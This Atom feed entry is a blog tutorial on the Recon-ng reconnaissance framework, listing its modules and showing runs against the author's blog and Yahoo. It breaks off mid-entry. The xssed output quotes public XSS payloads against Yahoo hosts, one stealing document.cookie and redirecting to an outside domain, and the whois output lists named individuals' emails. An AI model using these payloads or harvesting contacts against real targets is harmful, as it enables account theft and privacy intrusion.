<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: tools | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/tools/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-29T16:20:55-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="/images/tools/recon/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<p>``` plain
[recon-ng][default] > help</p>

<h2>Commands (type [help|?] <topic>):</h2>

<p>add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
```</p>

<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<p>``` plain
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |        Name       | Value |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | bing_api          |       |
  | builtwith_api     |       |
  | facebook_api      |       |
  | facebook_password |       |
  | facebook_secret   |       |
  | facebook_username |       |
  | flickr_api        |       |
  | fullcontact_api   |       |
  | google_api        |       |
  | google_cse        |       |
  | instagram_api     |       |
  | instagram_secret  |       |
  | ipinfodb_api      |       |
  | jigsaw_api        |       |
  | jigsaw_password   |       |
  | jigsaw_username   |       |
  | linkedin_api      |       |
  | linkedin_secret   |       |
  | pwnedlist_api     |       |
  | pwnedlist_iv      |       |
  | pwnedlist_secret  |       |
  | shodan_api        |       |
  | twitter_api       |       |
  | twitter_secret    |       |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<p>``` plain
[recon-ng][default] > keys add bing_api 007007
[*] Key &lsquo;bing_api&rsquo; added.
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  |        Name       | Value  |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  | bing_api          | 007007 |
```</p>

<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<p>``` plain
[recon-ng][default] > show
Shows various framework items</p>

<p>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]
```</p>

<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<h1>Recon-ng modules</h1>

<p>``` plain
show modules</p>

<p>  Discovery</p>

<hr />

<pre><code>discovery/info_disclosure/cache_snoop
discovery/info_disclosure/interesting_files
</code></pre>

<p>  Exploitation</p>

<hr />

<pre><code>exploitation/injection/command_injector
exploitation/injection/xpath_bruter
</code></pre>

<p>  Import</p>

<hr />

<pre><code>import/csv_file
import/list
</code></pre>

<p>  Recon</p>

<hr />

<pre><code>recon/companies-contacts/facebook
recon/companies-contacts/jigsaw/point_usage
recon/companies-contacts/jigsaw/purchase_contact
recon/companies-contacts/jigsaw/search_contacts
recon/companies-contacts/jigsaw_auth
recon/companies-contacts/linkedin_auth
recon/companies-multi/whois_miner
recon/companies-profiles/bing_linkedin
recon/contacts-contacts/mailtester
recon/contacts-contacts/mangle
recon/contacts-contacts/unmangle
recon/contacts-credentials/hibp_breach
recon/contacts-credentials/hibp_paste
recon/contacts-credentials/pwnedlist
recon/contacts-domains/migrate_contacts
recon/contacts-profiles/fullcontact
recon/credentials-credentials/adobe
recon/credentials-credentials/bozocrack
recon/credentials-credentials/hashes_org
recon/credentials-credentials/leakdb
recon/domains-contacts/pgp_search
recon/domains-contacts/salesmaple
recon/domains-contacts/whois_pocs
recon/domains-credentials/pwnedlist/account_creds
recon/domains-credentials/pwnedlist/api_usage
recon/domains-credentials/pwnedlist/domain_creds
recon/domains-credentials/pwnedlist/domain_ispwned
recon/domains-credentials/pwnedlist/leak_lookup
recon/domains-credentials/pwnedlist/leaks_dump
recon/domains-domains/brute_suffix
recon/domains-hosts/baidu_site
recon/domains-hosts/bing_domain_api
recon/domains-hosts/bing_domain_web
recon/domains-hosts/brute_hosts
recon/domains-hosts/builtwith
recon/domains-hosts/google_site_api
recon/domains-hosts/google_site_web
recon/domains-hosts/netcraft
recon/domains-hosts/shodan_hostname
recon/domains-hosts/ssl_san
recon/domains-hosts/vpnhunter
recon/domains-hosts/yahoo_domain
recon/domains-vulnerabilities/punkspider
recon/domains-vulnerabilities/xssed
recon/domains-vulnerabilities/xssposed
recon/hosts-domains/migrate_hosts
recon/hosts-hosts/bing_ip
recon/hosts-hosts/freegeoip
recon/hosts-hosts/ip_neighbor
recon/hosts-hosts/ipinfodb
recon/hosts-hosts/resolve
recon/hosts-hosts/reverse_resolve
recon/locations-locations/geocode
recon/locations-locations/reverse_geocode
recon/locations-pushpins/flickr
recon/locations-pushpins/instagram
recon/locations-pushpins/picasa
recon/locations-pushpins/shodan
recon/locations-pushpins/twitter
recon/locations-pushpins/youtube
recon/netblocks-companies/whois_orgs
recon/netblocks-hosts/reverse_resolve
recon/netblocks-hosts/shodan_net
recon/netblocks-ports/census_2012
recon/ports-hosts/migrate_ports
recon/profiles-contacts/dev_diver
recon/profiles-contacts/linkedin
recon/profiles-profiles/linkedin_crawl
recon/profiles-profiles/namechk
recon/profiles-profiles/profiler
recon/profiles-profiles/twitter
</code></pre>

<p>  Reporting</p>

<hr />

<pre><code>reporting/csv
reporting/html
reporting/json
reporting/list
reporting/pushpin
reporting/xlsx
reporting/xml
</code></pre>

<p>```</p>

<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<p>``` plain
[recon-ng][default][interesting_files] > show info</p>

<pre><code>  Name: Interesting File Finder
  Path: modules/discovery/info_disclosure/interesting_files.py
Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery
</code></pre>

<p>Description:
  Checks hosts for interesting files in predictable locations.</p>

<p>Options:
  Name      Current Value  Required  Description</p>

<hr />

<p>  DOWNLOAD  True           yes       download discovered files
  PORT      80             yes       request port
  PROTOCOL  http           yes       request protocol
  SOURCE    default        yes       source of input (see &lsquo;show info&rsquo; for details)</p>

<p>Source Options:
  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL ORDER BY host
  <string>       string representing a single input
  <path>         path to a file containing a list of inputs
  query <sql>    database query returning one column of inputs</p>

<p>Comments:
  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,
  server-status, jmx-console/, admin-console/, web-console/
  * Google Dorks:</p>

<pre><code>- inurl:robots.txt ext:txt
- inurl:elmah.axd ext:axd intitle:"Error log for"
- inurl:server-status "Apache Status"
</code></pre>

<p>```</p>

<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<p><code>plain
[recon-ng][default][interesting_files] &gt; run
[*] http://chousensha.github.io:80/robots.txt =&gt; 200. 'robots.txt' found!
[*] http://chousensha.github.io:80/sitemap.xml =&gt; 200. 'sitemap.xml' found!
[*] http://chousensha.github.io:80/sitemap.xml.gz =&gt; 404
[*] http://chousensha.github.io:80/crossdomain.xml =&gt; 404
[*] http://chousensha.github.io:80/phpinfo.php =&gt; 404
[*] http://chousensha.github.io:80/test.php =&gt; 404
[*] http://chousensha.github.io:80/elmah.axd =&gt; 404
[*] http://chousensha.github.io:80/server-status =&gt; 404
[*] http://chousensha.github.io:80/jmx-console/ =&gt; 404
[*] http://chousensha.github.io:80/admin-console/ =&gt; 404
[*] http://chousensha.github.io:80/web-console/ =&gt; 404
[*] 2 interesting files found.
[*] ...downloaded to '/root/.recon-ng/workspaces/default/'
</code></p>

<p>You can see recon-ng found 2 interesting files and it downloaded them to my machine</p>

<h2>Exploitation</h2>

<ul>
<li><p>Remote Command Injection Shell Interface &ndash; Provides a shell interface for remote command injection flaws in web applications</p></li>
<li><p>Xpath Injection Brute Forcer &ndash; Exploits XPath injection flaws to enumerate the contents of serverside XML documents</p></li>
</ul>


<h2>Import</h2>

<ul>
<li><p>Advanced CSV File Importer &ndash; Imports values from a CSV file into a database table.</p></li>
<li><p>List File Importer &ndash; Imports values from a list file into a database table and column</p></li>
</ul>


<h2>Recon</h2>

<ul>
<li><p>Facebook Contact Enumerator &ndash; Harvests contacts from Facebook.com. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw &ndash; Point Usage Statistics Fetcher &ndash; Queries the Jigsaw API for the point usage statistics of the given account.</p></li>
<li><p>Jigsaw &ndash; Single Contact Retriever &ndash; Retrieves a single complete contact from the Jigsaw.com API using points from the given account</p></li>
<li><p>Jigsaw Contact Enumerator &ndash; Harvests contacts from the Jigsaw.com API. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw Authenticated Contact Enumerator &ndash; Harvests contacts from Data.com using an authenticated user account. Updates the &lsquo;contacts&rsquo; table
with the results. Use &lsquo;keys&rsquo; to set your jigsaw username and password before use.</p></li>
<li><p>LinkedIn Authenticated Contact Enumerator &ndash; Harvests contacts from the LinkedIn.com API using an authenticated connections network. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Whois Data Miner &ndash; Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the
given company search string. Updates the respective tables with the results.</p></li>
</ul>


<p>Let&rsquo;s see this in action against Yahoo:</p>

<p>``` plain
[recon-ng][default][whois_miner] > run
[*] URL: <a href="http://whois.arin.net/rest/orgs;name=yahoo">http://whois.arin.net/rest/orgs;name=yahoo</a></p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 701 First Avenue, Sunnyvale, CA 94089
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/nets">http://whois.arin.net/rest/org/YAHOO-1/nets</a>
[<em>] Netblock: 8.3.34.0/23
[</em>] Netblock: 216.34.77.0/25
[<em>] Netblock: 8.8.178.0/24
[</em>] Netblock: 64.209.232.0/24
[<em>] Netblock: 64.39.38.208/28
[</em>] Netblock: 204.71.177.0/24
[<em>] Netblock: 204.71.188.0/24
[</em>] Netblock: 216.136.220.128/25
[<em>] Netblock: 64.56.197.208/28
[</em>] Netblock: 67.72.118.0/23
[<em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/pocs">http://whois.arin.net/rest/org/YAHOO-1/pocs</a>
[</em>] Contact: Netblock Admin (<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6e;&#x65;&#x74;&#98;&#x6c;&#111;&#x63;&#107;&#97;&#100;&#x6d;&#105;&#110;&#x40;&#x79;&#97;&#104;&#x6f;&#x6f;&#x2d;&#105;&#x6e;&#x63;&#x2e;&#99;&#x6f;&#109;">&#x6e;&#101;&#116;&#98;&#x6c;&#x6f;&#99;&#107;&#97;&#100;&#x6d;&#105;&#110;&#64;&#x79;&#x61;&#104;&#111;&#111;&#45;&#x69;&#x6e;&#99;&#46;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
[<em>] Contact: Netblock Admin (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#110;&#101;&#116;&#98;&#108;&#111;&#99;&#107;&#97;&#x64;&#109;&#105;&#110;&#64;&#121;&#97;&#104;&#x6f;&#111;&#45;&#x69;&#x6e;&#x63;&#46;&#99;&#111;&#x6d;">&#x6e;&#101;&#116;&#98;&#x6c;&#111;&#99;&#x6b;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#x79;&#97;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#110;&#x63;&#46;&#99;&#x6f;&#x6d;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
[</em>] Contact: Network Abuse (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#97;&#x62;&#117;&#115;&#x65;&#x40;&#121;&#x61;&#104;&#111;&#111;&#x2d;&#x69;&#x6e;&#99;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#117;&#x73;&#x65;&#x40;&#121;&#x61;&#104;&#111;&#x6f;&#45;&#105;&#x6e;&#99;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 325 Geri St, Lawrenceburg, TN 38464
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/nets">http://whois.arin.net/rest/org/YAHOO-10/nets</a>
[<em>] Netblock: 12.23.247.176/29
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/pocs">http://whois.arin.net/rest/org/YAHOO-10/pocs</a>
[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#106;&#x6b;&#105;&#x6c;&#98;&#117;&#x72;&#110;&#x31;&#115;&#x74;&#x6f;&#x70;&#64;&#x79;&#97;&#104;&#x6f;&#x6f;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#107;&#105;&#108;&#x62;&#117;&#x72;&#x6e;&#49;&#x73;&#116;&#x6f;&#x70;&#64;&#121;&#x61;&#104;&#111;&#x6f;&#x2e;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
[</em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#106;&#x6b;&#x69;&#108;&#x62;&#x75;&#114;&#x6e;&#49;&#115;&#116;&#111;&#x70;&#x40;&#x79;&#97;&#104;&#x6f;&#111;&#x2e;&#99;&#111;&#109;">&#x6a;&#107;&#x69;&#108;&#x62;&#117;&#114;&#110;&#49;&#x73;&#116;&#111;&#x70;&#x40;&#121;&#97;&#x68;&#111;&#111;&#46;&#99;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
[<em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x6a;&#107;&#105;&#x6c;&#98;&#117;&#x72;&#110;&#49;&#115;&#x74;&#111;&#112;&#64;&#x79;&#x61;&#104;&#x6f;&#x6f;&#46;&#x63;&#x6f;&#x6d;">&#106;&#x6b;&#x69;&#108;&#98;&#117;&#114;&#110;&#x31;&#115;&#x74;&#111;&#112;&#x40;&#121;&#97;&#x68;&#111;&#111;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
[</em>] URL: <a href="http://whois.arin.net/rest/customers;name=yahoo">http://whois.arin.net/rest/customers;name=yahoo</a></p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 225 Broadway, San Diego, CA 92101
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146168/nets">http://whois.arin.net/rest/customer/C00146168/nets</a>
[<em>] Netblock: 209.132.98.0/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146168/pocs">http://whois.arin.net/rest/customer/C00146168/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 225 Broadway, San Diego, CA 92101
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146169/nets">http://whois.arin.net/rest/customer/C00146169/nets</a>
[<em>] Netblock: 209.132.98.8/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146169/pocs">http://whois.arin.net/rest/customer/C00146169/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 624 S Grand, Los Angeles, CA 90017
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C01196389/nets">http://whois.arin.net/rest/customer/C01196389/nets</a>
[<em>] Netblock: 65.91.7.80/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C01196389/pocs">http://whois.arin.net/rest/customer/C01196389/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>SUMMARY</h2>

<p>[<em>] 5 total (2 new) companies found.
[</em>] 5 total (4 new) locations found.
[<em>] 14 total (14 new) netblocks found.
[</em>] 6 total (6 new) contacts found.
```</p>

<ul>
<li><p>Bing Linkedin Profile Harvester &ndash; Harvests contacts from linkedin.com by querying Bing for Linkedin pages related to the given
companies, parsing the profiles, and adding them to the &lsquo;profiles&rsquo; table</p></li>
<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various
paste sites. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>PwnedList Validator &ndash; Leverages PwnedList.com to determine if email addresses are associated with leaked credentials. Adds
compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Contacts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames associated with email addresses stored in the &lsquo;contacts&rsquo;
table.</p></li>
<li><p>FullContact Contact Enumerator &ndash; Harvests contact information and profiles from the fullcontact.com API using email addresses as
input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
table with the positive results.</p></li>
<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
positive results.</p></li>
<li><p>leakdb Hash Lookup &ndash; Uses the leakdb hash database to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with
the positive results.</p></li>
<li><p>PGP Key Owner Lookup &ndash; Searches the MIT public PGP key server for email addresses of the given domain. Updates the
&lsquo;contacts&rsquo; table with the results</p></li>
</ul>


<p>This module is similar to <a href="recon/domains-contacts/salesmaple">theHarvester</a></p>

<ul>
<li><p>SalesMaple Contact Harvester &ndash; Harvests contacts from the SalesMaple API using domains as input. Updates the &lsquo;contacts&rsquo; table with
the results.</p></li>
<li><p>Whois POC Harvester &ndash; Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; Account Credentials Fetcher &ndash; Queries the PwnedList API for credentials associated with the given usernames. Updates the
&lsquo;credentials&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; API Usage Statistics Fetcher &ndash; Queries the PwnedList API for account usage statistics</p></li>
<li><p>PwnedList &ndash; Pwned Domain Credentials Fetcher &ndash; Queries the PwnedList API to fetch all credentials for a domain. Updates the &lsquo;credentials&rsquo; table
with the results</p></li>
<li><p>PwnedList &ndash; Pwned Domain Statistics Fetcher &ndash; Queries the PwnedList API for a domain to determine if any associated credentials have been
compromised. This module does NOT return any credentials, only a total number of compromised
credentials.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leak_lookup.py) &ndash; Queries the local database for information associated with a leak ID. The &lsquo;leaks_dump&rsquo; module must
be used to populate the local database before this module will execute successfully.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leaks_dump.py) &ndash; Queries the PwnedList API for information associated with all known leaks. Updates the &lsquo;leaks&rsquo; table with the results.</p></li>
<li><p>DNS Public Suffix Brute Forcer &ndash; Brute forces TLDs and SLDs using DNS. Updates the &lsquo;domains&rsquo; table with the results</p></li>
<li><p>Baidu Hostname Enumerator &ndash; Harvests hosts from Baidu.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Bing API Hostname Enumerator &ndash; Leverages the Bing API and &ldquo;domain:&rdquo; advanced search operator to harvest hosts. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>Bing Hostname Enumerator &ndash; Harvests hosts from Bing.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>DNS Hostname Brute Forcer &ndash; Brute forces host names using DNS. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>BuiltWith Enumerator &ndash; Leverages the BuiltWith API to identify hosts, technologies, and contacts associated with a domain</p></li>
<li><p>Google CSE Hostname Enumerator &ndash; Leverages the Google Custom Search Engine API to harvest hosts using the &lsquo;site&rsquo; search operator.
Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Google Hostname Enumerator &ndash; Harvests hosts from Google.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Netcraft Hostname Enumerator &ndash; Harvests hosts from Netcraft.com. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Shodan Hostname Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;hostname&rsquo; search operator. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>SSL SAN Lookup &ndash; Uses the ssltools.com site to obtain the Subject Alternative Names for a domain. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>VPNHunter Lookup &ndash; Checks vpnhunter.com for SSL VPNs, remote accesses, email portals and generic login sites. Updates
the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Yahoo Hostname Enumerator &ndash; Harvests hosts from Yahoo.com by using the &lsquo;domain&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results.</p></li>
<li><p>PunkSPIDER Vulnerabilty Finder &ndash; Leverages the PunkSPIDER API to search for previosuly discovered vulnerabltiies on hosts within a
domain.</p></li>
<li><p>XSSed Domain Lookup &ndash; Checks XSSed.com for XSS records associated with a domain and displays the first 20 results</p></li>
</ul>


<p>This is a very handy module for XSS lookup. Let&rsquo;s take a look at it:</p>

<p>``` plain
[recon-ng][default][xssed] > run</p>

<hr />

<h2>YAHOO.COM</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20">http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20</a>(docume<br>nt.cookie);document.location%20=%20%22<a href="http://1337hax0rz.com%22">http://1337hax0rz.com%22</a>
[<em>] Host: adz.kr.yahoo.com
[</em>] Publish_Date: 2015-03-10 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/60821/">http://xssed.com/mirror/60821/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript">http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript</a><br>:alert(/412/)
[<em>] Host: us.yimg.vip.scd.yahoo.com
[</em>] Publish_Date: 2012-02-16 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/57596/">http://xssed.com/mirror/57596/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: Script Insertion
[</em>] Example: <a href="http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert">http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert</a>(String.fromCharCode(88%2C83%2C83))%3C%2Fsc<br>ript%3E&amp;sort=relevance
[<em>] Host: fr.groups.yahoo.com
[</em>] Publish_Date: 2011-12-22 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/61982/">http://xssed.com/mirror/61982/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=">http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=</a><script>alert(/XSS-by-[]0iZy5/)&lt;/scri<br>pt>
[<em>] Host: basketball.fantasysports.yahoo.com
[</em>] Publish_Date: 2011-12-21 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/71051/">http://xssed.com/mirror/71051/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: Redirect
[</em>] Example: <a href="http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO">http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO</a><br>O/EXP=1275539597/L=hnNys0Kjqbp5Cok8Sr10cAJDTPYa3UwHFG0AANhn/B=VSDoPmKJiUs-/J=1275532397077354/K=rS6p<br>wy3MN2NPP7SBqBCOAQ/A=6097785/R=0/SIG=11o4aqdmv/<em><a href="http://xssed.com/newsearch/searchpad.html">http://xssed.com/newsearch/searchpad.html</a>
[</em>] Host: www.yahoo.com
[<em>] Publish_Date: 2011-12-21 00:00:00
[</em>] Reference: <a href="http://xssed.com/mirror/67076/">http://xssed.com/mirror/67076/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[snip]
```</p>

<ul>
<li>XSSposed Domain Lookup &ndash; Checks XSSposed.com for XSS records associated with a domain</li>
</ul>


<p>Another good module for hunting down XSS</p>

<p>``` plain
[recon-ng][default][xssposed] > run</p>

<hr />

<h2>BITDEFENDER.COM</h2>

<p>[<em>] Category: REDIRECT
